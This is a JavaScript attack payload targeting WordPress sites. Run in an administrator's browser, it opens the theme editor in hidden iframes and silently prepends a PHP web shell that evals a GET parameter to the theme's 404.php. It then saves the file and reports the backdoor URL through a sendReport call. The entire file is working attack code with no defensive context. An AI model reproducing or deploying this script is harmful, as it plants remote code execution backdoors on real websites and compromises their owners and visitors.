var payload = "<?php if(isset($_GET['a'])){eval($_GET['a']);}; ?>"+"\n";
SitePath = document.head.innerHTML.match(/href=\"(.*?)\/xmlrpc.php/m)[1]
function eas(){
	ov = window.frames.win404.document.getElementById('newcontent').value
	window.frames.win404.document.getElementById('newcontent').value = payload + ov
	document.getElementsByName('win404')[0].setAttribute("onload","");
	window.frames.win404.document.getElementsByName('submit')[0].click()
	sendReport('Check your backdoor here: ' + SitePath + '/wp-content/themes/' + themeName + '/404.php?a=phpinfo();');
}

function pao(){
	ewin = window.frames.editor.contentWindow || window.frames.contentDocument
	url404 = unescape(ewin.document.getElementById('templateside').getElementsByTagName('a')[0].href)
        filepar = url404.match(/\?file\=(.*?)\&/m)[1]
	if(filepar.length>10){
		themeName = url404.match(/file\=\/themes\/(.*?)\//m)[1]
	}
	else{
		themeName = url404.match(/theme\=(.*?)$/m)[1]
	}
	var win404 = document.createElement("iframe");
	win404.style.opacity = 0;
	win404.name = 'win404';
	win404.src = url404
	win404.setAttribute("onload","eas()");
	document.body.appendChild(win404);
}

var editor = document.createElement("iframe");
editor.style.opacity=0
editor.name = 'editor';
editor.src = SitePath+"/wp-admin/theme-editor.php";
editor.setAttribute("onload","pao()");
document.body.appendChild(editor);